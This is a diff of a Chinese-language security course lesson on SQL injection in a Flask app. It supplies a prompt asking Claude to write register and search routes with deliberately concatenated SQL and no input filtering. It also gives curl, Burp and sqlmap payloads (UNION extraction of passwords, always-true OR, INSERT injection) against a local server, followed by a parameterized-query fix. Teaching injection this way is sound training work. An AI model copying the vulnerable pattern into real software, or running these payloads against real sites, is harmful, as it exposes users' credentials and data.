@@ -1,263 +1,216 @@
 # Day 3 - SQL 注入漏洞
 
-## 一、页面部署提示词
+---
 
-> 学生将此提示词发给 Claude，即可生成带 SQL 注入漏洞的功能：
+## 一、发给 Claude 的提示词
+
+把以下内容完整复制粘贴到 claude.ai 对话框中：
 
 ```
-在 Flask 项目中添加数据库操作功能，要求：
-1. 用户注册时把数据存入 SQLite 数据库
-2. 实现搜索用户功能：GET /search?keyword=xxx
-3. SQL 查询直接用字符串拼接的方式构建
-4. 登录时从数据库查询用户，也是字符串拼接
-5. 不要使用 ORM 或参数化查询，方便初学者理解 SQL
-6. 添加一些调试日志，方便观察执行的 SQL 语句
+请在上次已生成的登录功能基础上，继续增加用户注册和搜索功能。保持原有登录功能不变。
+
+### 在 app.py 中新增以下内容：
+
+1. 在文件开头新增导入：import sqlite3, os
+2. 新增一个初始化数据库的函数 init_db()，在启动时调用：
+   - 数据库文件保存在 data/ 目录下，文件名为 users.db
+   - 创建 users 表，包含字段：id (自增主键)、username (唯一)、password、email、phone
+   - 插入默认用户：admin/admin123、alice/alice2025
+   - 使用 INSERT OR IGNORE 防止重复插入
+
+3. 新增注册路由 /register，支持 GET 和 POST：
+   - 显示注册页面 register.html，包含用户名、密码、邮箱、手机号输入框
+   - POST 提交时将数据用字符串拼接方式插入到 SQLite 数据库中
+   - 注册成功后跳转到登录页并提示"注册成功，请登录"
+   - 注意：SQL 语句必须使用 f-string 字符串拼接，不要用参数化查询或 ORM
+
+4. 新增搜索路由 /search，支持 GET：
+   - 通过 URL 参数 keyword 接收关键词
+   - 使用字符串拼接方式拼接 SQL 查询：
+     SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'
+   - 搜索结果显示在首页，以表格形式展示：ID、用户名、邮箱、手机
+   - 注意：SQL 语句必须使用 f-string 字符串拼接，不要用参数化查询
+   - 在后台打印执行的 SQL 语句到控制台，方便调试
+
+### 新增 templates/register.html
+
+注册页面，继承 base.html，包含用户名、密码、邮箱、手机号输入框和注册按钮。
+
+### 修改 templates/index.html
+
+在首页已登录状态下添加搜索功能：
+- 搜索输入框和搜索按钮
+- 搜索结果以表格形式显示在搜索框下方
+- 如果有关键词但没有结果，显示"无搜索结果"
+
+### 修改 templates/base.html
+
+在导航栏未登录状态下添加"注册"链接。
+
+### 代码规范要求
+- 注册和搜索的 SQL 查询必须使用 f-string 字符串拼接，不能使用参数化查询
+- 不要对用户输入做任何过滤或转义
+- 搜索功能要打印 SQL 到控制台方便观察注入效果
+- 保持原有登录功能不变
+
+生成全部代码后告诉我，我复制覆盖到本地项目。
 ```
 
 ---
 
-## 二、漏洞关键代码解释
+## 二、学生操作步骤
 
-### 漏洞 1：登录查询 SQL 注入
-
-```python
-# core/database.py
-def query_users(username, password):
-    conn = get_db_connection()
-    cursor = conn.cursor()
-    # ↓↓↓ 漏洞行：直接拼接用户输入到 SQL 语句
-    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
-    print(f"[DEBUG] 执行查询: {query}")  # 调试日志方便观察注入效果
-    cursor.execute(query)
-    result = cursor.fetchone()
-    conn.close()
-    return result
-```
-
-**问题**：`username` 和 `password` 来自用户输入，直接拼接到 SQL 语句中。如果用户输入 `admin' OR '1'='1`，SQL 变成：
-
-```sql
-SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = ''
-```
-
-由于 `OR '1'='1'` 永远为真，**跳过密码验证**，直接登录成功。
-
-### 漏洞 2：搜索功能 SQL 注入
-
-```python
-def search_users(keyword):
-    conn = get_db_connection()
-    cursor = conn.cursor()
-    # ↓↓↓ 漏洞行
-    query = f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
-    cursor.execute(query)
-    results = cursor.fetchall()
-    conn.close()
-    return results
-```
-
-**问题**：`keyword` 直接拼入 LIKE 子句。攻击者可以注入 UNION 查询获取全部数据。
-
-### 漏洞 3：注册功能 SQL 注入
-
-```python
-def add_user(username, password, email, phone):
-    conn = get_db_connection()
-    cursor = conn.cursor()
-    # ↓↓↓ 漏洞行
-    query = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"
-    cursor.execute(query)
-    conn.commit()
-    conn.close()
-    return cursor.lastrowid
-```
-
-**问题**：注册输入也拼接 SQL，可进行二次注入或堆叠查询。
+| 步骤 | 操作 | 说明 |
+|------|------|------|
+| 1 | 复制上面提示词发给 Claude | 在已有登录功能基础上增加注册和搜索 |
+| 2 | Claude 生成后，覆盖 app.py 和 templates | 保持原有登录功能不变 |
+| 3 | 终端运行 `python app.py` | 启动项目 |
+| 4 | 浏览器访问 http://127.0.0.1:5000 | 测试注册和搜索 |
+| 5 | 用 curl 验证 SQL 注入漏洞 | 见下方 POC |
+| 6 | 分析代码，编写修复到 fix/database_fix.py | 修复漏洞 |
+| 7 | `git add -A && git commit -m "day-03: 注册搜索 + SQL注入修复"` | 提交成果 |
 
 ---
 
-## 三、漏洞成因总结
+## 三、漏洞原理
 
-| 漏洞 | 根本原因 | 危害 |
-|------|---------|------|
-| 万能密码登录 | 字符串拼接 SQL，`OR '1'='1'` 绕过 | 无需密码登录任意账号 |
-| UNION 注入 | 搜索功能未过滤，可 UNION 查询 | 窃取所有数据库数据 |
-| 注册注入 | INSERT 语句也拼接 | 篡改数据库内容 |
-| 盲注风险 | 无任何输入过滤 | 可逐字符猜解数据 |
+### 漏洞 1：字符串拼接 SQL 查询
+
+注册和搜索功能中，用户输入直接拼接到 SQL 语句中：
+
+```python
+# 注册 - 字符串拼接
+query = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"
+
+# 搜索 - 字符串拼接
+query = f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
+```
+
+**危害**：用户输入中的特殊字符（如单引号 `'`）会改变 SQL 语句的结构，导致任意 SQL 命令执行。
+
+### 漏洞 2：无任何输入过滤
+
+所有用户输入直接传入 SQL 语句，没有做任何转义或过滤。
+
+### 漏洞 3：搜索结果有回显
+
+搜索结果直接以表格形式展示在页面上，攻击者可以通过 UNION 注入获取任意数据。
 
 ---
 
 ## 四、POC 代码
 
-### POC 1：万能密码登录
-
-```bash
-# 使用 SQL 注入绕过登录验证
-curl http://127.0.0.1:5000/login \
-  -d "username=admin' OR '1'='1&password="
-```
-
-**预期结果**：即使密码为空，也能以 admin 身份登录成功。
-
-### POC 2：搜索功能 UNION 注入
+### POC 1：UNION 注入获取任意数据
 
 ```bash
 # 先登录获取 session
-curl http://127.0.0.1:5000/login \
-  -d "username=admin&password=admin123" \
-  -c /tmp/cookies.txt
+curl http://127.0.0.1:5000/login -d "username=admin&password=admin123" -c /tmp/cookies.txt
 
-# UNION 注入：从 users 表提取所有数据
-curl "http://127.0.0.1:5000/search?keyword=' UNION SELECT 1,'hacked','pwned','hack@x.com','13800000000','admin',99999 --" \
-  -b /tmp/cookies.txt | grep "hacked"
+# UNION 注入：向搜索结果的表中插入自定义数据
+curl "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj@x.com%27,%27138%27--" -b /tmp/cookies.txt | grep "inj"
 ```
 
-**预期结果**：搜索结果中出现攻击者伪造的 `hacked` 用户。
+**预期输出**：搜索结果中出现 "inj" 用户名。
 
-### POC 3：SQLMap 自动化注入
+### POC 2：OR 注入搜索全部用户
 
 ```bash
-# 获取 session cookie
-SESSION=$(curl http://127.0.0.1:5000/login \
-  -d "username=admin&password=admin123" \
-  -c - | grep session | awk '{print $NF}')
+# OR 注入：让 WHERE 条件永远为真，返回所有用户
+curl "http://127.0.0.1:5000/search?keyword=%27%20OR%20%271%27%3D%271" -b /tmp/cookies.txt
+```
 
-# SQLMap 自动检测并利用
-sqlmap -u "http://127.0.0.1:5000/search?keyword=admin" \
-  --cookie="session=$SESSION" \
-  --batch \
-  --dump
+**预期输出**：显示数据库中所有用户，包括 admin、alice 和其他注册用户。
+
+### POC 3：注册功能 SQL 注入
+
+```bash
+# 注册时注入 SQL，在用户名中插入特殊字符
+curl http://127.0.0.1:5000/register -d "username=hacker', 'pass', 'h@x.com', '123')--&password=irrelevant"
 ```
 
 ---
 
-## 五、POC 代码测试方法（Burp Suite + SQLMap）
+## 五、Burp Suite 测试方法
 
-### 方法 1：手动测试（Burp Suite）
-
-1. **拦截搜索请求**
-   - 登录后，在搜索框输入 `admin`
-   - Burp 中拦截到 `GET /search?keyword=admin`
-   - 发送到 Repeater
-
-2. **测试注入点**
-   - 修改 keyword 参数为：`admin' OR '1'='1`
-   - 如果返回更多结果，说明存在注入
-
-3. **测试 UNION 注入**
-   - 修改为：`' UNION SELECT 1,2,3,4,5,6,7 --`
-   - 观察结果中是否出现 `2,3,4` 等数字
-
-4. **提取数据**
-   - 查询所有表：`' UNION SELECT name,sql,3,4,5,6,7 FROM sqlite_master --`
-   - 提取密码：`' UNION SELECT username,password,3,4,5,6,7 FROM users --`
-
-### 方法 2：SQLMap 自动化
-
-```bash
-# 自动检测注入点
-sqlmap -u "http://127.0.0.1:5000/search?keyword=admin" \
-  --cookie="session=你的session值" \
-  --batch \
-  --level 3 \
-  --risk 2
-
-# 自动获取所有数据
-sqlmap -u "..." --cookie="..." --batch --dump-all
-```
+1. 登录后拦截 GET /search?keyword=admin 请求
+2. 发送到 Repeater
+3. 修改 keyword 参数测试：
+   - `admin' OR '1'='1` → 应返回所有用户
+   - `' UNION SELECT 1,2,3,4--` → 应返回数字代替数据
+   - `' UNION SELECT 1,username,email,phone FROM users--` → 应返回所有用户名和邮箱
+4. 观察响应变化，确认注入生效
 
 ---
 
 ## 六、POC 代码详细解释
 
-### POC 1 详解：万能密码
-
-```bash
-curl http://127.0.0.1:5000/login \
-  -d "username=admin' OR '1'='1&password="
-```
-
-**Payload 分析**：
-
-| 输入 | 值 | 作用 |
-|------|----|------|
-| `username` | `admin' OR '1'='1` | 闭合前引号，插入 OR 永真条件 |
-| `password` | 空 | 密码任意，因为永真条件跳过了密码检查 |
-
-**生成的 SQL**：
-```sql
-SELECT * FROM users 
-WHERE username = 'admin' OR '1'='1' AND password = ''
-```
-       ^^^^^^^^^^^^   ^^^^^^^^^^^^
-       正常条件       永真条件（使 WHERE 永远为 True）
-
-**执行逻辑**：`WHERE (username='admin') OR ('1'='1' AND password='')`。由于 `'1'='1'` 永远为真，即使第一个条件不满足（用户不存在），整个 WHERE 子句也返回 True，**返回表中第一行用户的数据**。
-
-### POC 2 详解：UNION 注入
+### POC 1 详解：UNION 注入
 
 ```
-搜索关键词: ' UNION SELECT 1,'hacked','pwned','hack@x.com','13800000000','admin',99999 --
+原 SQL：SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'
+
+输入 keyword = ' UNION SELECT 1,'inj','inj@x.com','138'--
+
+生成 SQL：
+SELECT * FROM users
+WHERE username LIKE '%' UNION SELECT 1,'inj','inj@x.com','138'--%'
+      ^^^^^^^^
+      UNION 合并第二个查询的结果
+
+第二个查询返回：1, inj, inj@x.com, 138
+这些数据会出现在原始的搜索结果中
 ```
 
-**生成的 SQL**：
-```sql
-SELECT * FROM users 
-WHERE username LIKE '%' UNION SELECT 1,'hacked','pwned','hack@x.com','13800000000','admin',99999 --%' 
-      ^^^^^  UNION 关键字，将两个查询结果合并
-             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-             攻击者控制的第二个查询，返回自定义数据
-                                                                                                          ^^
-                                                                                                          注释符，去掉后面内容
+**为什么列数必须是 4？**
+
+```
+SELECT * FROM users  返回 4 列（id, username, email, phone）
+UNION SELECT 1,'inj','inj@x.com','138'  也必须返回 4 列
+
+如果列数不匹配，SQLite 会报错：
+"SELECTs to the left and right of UNION do not have the same number of result columns"
 ```
 
-**注意**：UNION 要求两个 SELECT 返回的列数相同。users 表有 7 列，所以攻击者提供了 7 个值。通过逐个尝试列数（UNION SELECT 1,2,3...）可以确定正确的列数。
+### POC 2 详解：OR 万能条件
 
-### POC 3 详解：SQLMap
-
-```bash
-sqlmap -u "http://127.0.0.1:5000/search?keyword=admin" \
-  --cookie="session=..." --batch --dump
 ```
+原 SQL：SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'
 
-| 参数 | 含义 |
-|------|------|
-| `-u` | 目标 URL |
-| `--cookie` | 认证 cookie（需要登录后才能搜索） |
-| `--batch` | 自动选择默认选项，无需人工交互 |
-| `--dump` | 导出所有数据库数据 |
+输入 keyword = ' OR '1'='1
 
-SQLMap 会自动：
-1. 检测注入点是否存在
-2. 判断注入类型（UNION/布尔盲注/时间盲注）
-3. 获取数据库类型和版本
-4. 枚举所有表名和列名
-5. 导出全部数据
+生成 SQL：
+SELECT * FROM users
+WHERE username LIKE '%' OR '1'='1%' OR email LIKE '%' OR '1'='1%'
+                       ^^^^^^^^^^^
+                       永真条件，所有行都匹配
+
+结果：返回 users 表中的全部数据
+```
 
 ---
 
 ## 七、修复方案
 
+创建 `fix/database_fix.py`：
+
 ```python
-# fix/database_fix.py
 import sqlite3
 
-def query_users_fixed(username, password):
+def add_user_fixed(username, password, email, phone):
     """使用参数化查询修复 SQL 注入"""
-    conn = get_db_connection()
+    conn = sqlite3.connect("data/users.db")
     cursor = conn.cursor()
-    # 修复：使用 ? 占位符，数据库驱动会自动处理转义
-    query = "SELECT * FROM users WHERE username = ? AND password = ?"
-    cursor.execute(query, (username, password))  # 参数分开传递
-    result = cursor.fetchone()
+    # 修复：使用 ? 占位符替代字符串拼接
+    query = "INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)"
+    cursor.execute(query, (username, password, email, phone))
+    conn.commit()
     conn.close()
-    return result
 
 def search_users_fixed(keyword):
     """参数化 LIKE 查询"""
-    conn = get_db_connection()
+    conn = sqlite3.connect("data/users.db")
     cursor = conn.cursor()
-    # 修复：keyword 作为参数传入，即使用户输入 % 或 ' 也不会被解析为 SQL
+    # 修复：keyword 作为参数传入
     query = "SELECT * FROM users WHERE username LIKE ? OR email LIKE ?"
     cursor.execute(query, (f'%{keyword}%', f'%{keyword}%'))
     results = cursor.fetchall()
@@ -265,26 +218,26 @@ def search_users_fixed(keyword):
     return results
 ```
 
-**为什么参数化查询能防御 SQL 注入？**
-
-```
-用户输入:  admin' OR '1'='1
-
-拼接方式（有漏洞）:
-  f"WHERE username = '{username}'"
-  → WHERE username = 'admin' OR '1'='1'    ← ' 闭合了字符串，OR 成为了 SQL 关键字
-
-参数化方式（安全）:
-  cursor.execute("WHERE username = ?", (username,))
-  → WHERE username = "admin' OR '1'='1"     ← 整个输入被视为字符串值，' 不参与 SQL 解析
-```
+然后在 app.py 中将注册和搜索路由改为使用修复版本。
 
 ---
 
-## 八、课后作业
+## 八、漏洞复现检查清单
 
-1. 在 `fix/` 目录创建 `database_fix.py`，修复全部三个函数
-2. 修改 `app.py` 中的导入，使用修复版本
-3. 验证 POC 1、2、3 均无法利用
-4. 尝试不同的注入 payload，理解参数化查询如何防御
-5. （进阶）尝试用 sqlmap 的 `--tamper` 参数绕过简单 WAF
+| # | 检查项 | curl 命令 | 预期结果 |
+|---|--------|----------|---------|
+| 1 | UNION 注入 | `?...keyword=%27 UNION SELECT 1,2,3,4--` | 出现数字 2、3、4 |
+| 2 | OR 万能搜索 | `?...keyword=%27 OR '1'='1` | 显示全部用户 |
+| 3 | SQL 语句打印 | 查看控制台 | 显示拼接后的 SQL |
+| 4 | 数据泄露 | UNION 注入提取数据 | 获取其他用户信息 |
+
+---
+
+## 九、课后任务
+
+1. 确定当前 users 表的列数（用 ORDER BY 或不断尝试 UNION）
+2. 用 UNION 注入从数据库中提取密码字段
+3. 在 fix/ 目录下编写参数化查询修复代码
+4. 验证修复后注入无法复现
+5. 尝试用 sqlmap 自动化注入：`sqlmap -u "http://127.0.0.1:5000/search?keyword=admin" --cookie="session=xxx" --batch --dump`
+6. 提交到自己的个人分支
